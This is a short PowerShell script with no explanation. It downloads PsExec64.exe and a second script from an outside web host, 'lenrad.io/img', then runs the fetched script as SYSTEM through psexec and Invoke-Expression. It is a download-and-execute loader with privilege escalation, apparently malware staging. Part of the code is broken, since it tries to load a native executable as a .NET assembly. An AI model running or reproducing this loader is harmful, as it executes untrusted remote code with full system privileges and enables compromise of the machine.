$psexecUrl = "http://lenrad.io/img/PsExec64.exe"
$scriptUrl = "http://lenrad.io/img/script1.ps1"
$psexecBytes = (Invoke-WebRequest -Uri $psexecUrl).Content
$psExecAssembly = [System.Reflection.Assembly]::Load($psexecBytes)
$scriptContent = (Invoke-WebRequest -Uri $scriptUrl).Content
$scriptBlock = [scriptblock]::Create($scriptContent)
$psExecCommand = "psexec64  -accepteula -s -i powershell.exe -Command `"$scriptBlock`""
Invoke-Expression -Command $psExecCommand